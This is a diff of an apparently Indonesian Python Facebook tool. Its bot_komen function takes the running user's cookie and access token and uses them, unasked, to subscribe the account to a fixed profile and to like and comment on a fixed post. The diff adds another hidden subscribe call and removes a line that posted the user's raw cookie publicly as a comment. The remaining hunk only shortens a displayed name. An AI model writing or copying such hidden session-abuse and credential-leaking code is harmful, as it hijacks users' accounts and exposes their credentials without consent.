@@ -1038,8 +1038,9 @@ def bot_komen(cok, ken):
 	with requests.Session() as r:
 		text = random.choice(['Keren Bang 😎', 'Hello World!', 'Mantap Bang ☺️', 'I Love You ❤️', 'Hai Bang 😘'])
 		r.cookies.update({'cookie': cok})
+		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
+		#r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
 		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={text}&access_token={ken}')
-		r.post(f'https://graph.facebook.com/926438272150751/comments/?message={cok}&access_token={ken}')
 		r.post(f'https://graph.facebook.com/926438272150751/likes?summary=true&access_token={ken}')
 		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={ken}')
 # ------------------[ INI BOT FOLLOW GOBLOG BTW FANKY GANTENG ]--------------#
@@ -1150,7 +1151,7 @@ def menu():
     # dia.append(Panel(f'{P2}IP      : {H2}{ip}\n{P2}premium : {H2}Premium\n{P2}Negara  : {H2}{negara}',width=30,style=f"{color_panel}"))
     dia.append(
         panel(
-            f"{P2}Name   : {H2}{my_name[:18]}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{(len(temanku))}\n{P2}IP     : {H2}{ip}",
+            f"{P2}Name   : {H2}{my_name[:15]}\n{P2}Idz    : {H2}{my_id}\n{P2}Teman  : {H2}{(len(temanku))}\n{P2}IP     : {H2}{ip}",
             title=f"{P2}Bio Data",
             width=30,
             style=f"{color_panel}",
